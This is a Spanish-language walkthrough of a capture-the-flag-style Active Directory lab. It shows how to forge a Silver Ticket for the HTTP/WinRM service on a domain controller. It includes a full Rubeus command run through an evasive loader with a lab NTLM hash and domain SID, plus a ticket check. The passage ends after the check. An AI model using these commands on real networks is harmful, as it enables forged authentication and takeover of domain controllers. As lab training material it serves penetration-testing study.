
## Tareas
- [ ] Obtener la ejecución de comandos en el controlador de dominio creando un *Silver Ticket* para *HTTP* y *WMI*

**Flag 18: Nombre del servicio cullo *Siver Ticket* se puede usar para winrs o PowerShell Remoting

## Soluciones
### Obtener la ejecución de comandos en el controlador de dominio creando un *Silver Ticket* para *HTTP* y *WMI*

En el anterior laboratorio obtenemos el hash de la cuenta controlador de dominio *DCORP-DC*
Ahora con ese hash NTLM podemos crear un *Siver Ticket* que nos proporcione acceso a un servicio *http (WinRM)* en el controlador de dominio
```shell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:e4ce16e20da2e11d2901e0fb8a4f28b0 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
```

Verificaremos si el ticket que hemos recibido es el del servicio correcto
```shell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args klist
```


